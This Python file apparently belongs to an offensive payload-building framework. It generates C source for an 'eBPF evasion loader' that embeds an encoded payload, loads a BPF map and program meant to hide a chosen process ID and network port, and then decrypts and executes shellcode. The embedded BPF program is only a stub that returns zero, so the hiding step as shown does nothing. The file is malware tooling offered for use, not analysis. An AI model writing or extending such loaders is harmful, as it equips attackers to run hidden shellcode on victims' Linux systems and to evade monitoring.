#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for eBPF-assisted Linux evasion loader (root/CAP_BPF)."""

from __future__ import annotations

from lib.compile.linux_injection_common import LinuxInjectionBuilder


def _bpf_insn_bytes() -> str:
    """Minimal tracepoint BPF program: return 0 (allow)."""
    return """
static struct bpf_insn hide_prog[] = {
    { .code = 0xb7, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0 },
    { .code = 0x95, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0 },
};
"""


class EbpfEvasionBuilder(LinuxInjectionBuilder):
    def build_source(
        self,
        encoded_payload: str,
        key: bytes,
        iv=None,
        *,
        hide_pid: int = 0,
        hide_port: int = 0,
    ) -> str:
        bpf_block = _bpf_insn_bytes()
        return f"""
{chr(10).join(self.headers())}
#include <linux/bpf.h>
#include <linux/filter.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

char* enc_payload = "{encoded_payload}";
static int hide_pid_cfg = {int(hide_pid)};
static int hide_port_cfg = {int(hide_port)};

{bpf_block}

#ifndef __NR_bpf
#if defined(__x86_64__)
#define __NR_bpf 321
#elif defined(__aarch64__)
#define __NR_bpf 280
#else
#define __NR_bpf 321
#endif
#endif

static int bpf_syscall(long cmd, union bpf_attr *attr, unsigned long size)
{{
    return (int)syscall(__NR_bpf, cmd, attr, size);
}}

static int install_ebpf_filters(void)
{{
    union bpf_attr attr;
    int map_fd, prog_fd, key;
    __u64 value;
    char license[] = "GPL";

    if (geteuid() != 0) {{
        fprintf(stderr, "ebpf_evasion: root required for BPF map/program load\\n");
        return -1;
    }}

    memset(&attr, 0, sizeof(attr));
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = sizeof(int);
    attr.value_size = sizeof(__u64);
    attr.max_entries = 4;
    map_fd = bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
    if (map_fd < 0) return -1;

    key = 0;
    value = (__u64)(unsigned int)hide_pid_cfg;
    memset(&attr, 0, sizeof(attr));
    attr.map_fd = map_fd;
    attr.key = (unsigned long)&key;
    attr.value = (unsigned long)&value;
    attr.flags = BPF_ANY;
    if (bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)) < 0)
        return -1;

    key = 1;
    value = (__u64)(unsigned int)hide_port_cfg;
    attr.key = (unsigned long)&key;
    attr.value = (unsigned long)&value;
    if (bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)) < 0)
        return -1;

    memset(&attr, 0, sizeof(attr));
    attr.prog_type = BPF_PROG_TYPE_TRACEPOINT;
    attr.insns = (unsigned long)hide_prog;
    attr.insn_cnt = sizeof(hide_prog) / sizeof(hide_prog[0]);
    attr.license = (unsigned long)license;
    attr.map_fd = map_fd;
    prog_fd = bpf_syscall(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (prog_fd < 0) {{
        close(map_fd);
        return -1;
    }}

    close(prog_fd);
    close(map_fd);
    return 0;
}}

int main(void)
{{
{self.decode_preamble()}
    if (install_ebpf_filters() != 0) {{
        fprintf(stderr, "ebpf_evasion: BPF install failed (errno=%d), continuing\\n", errno);
    }}
{self.decrypt_block(key, iv)}
{self.exec_shellcode_block()}
{self.cleanup_block()}
    return 0;
}}
"""
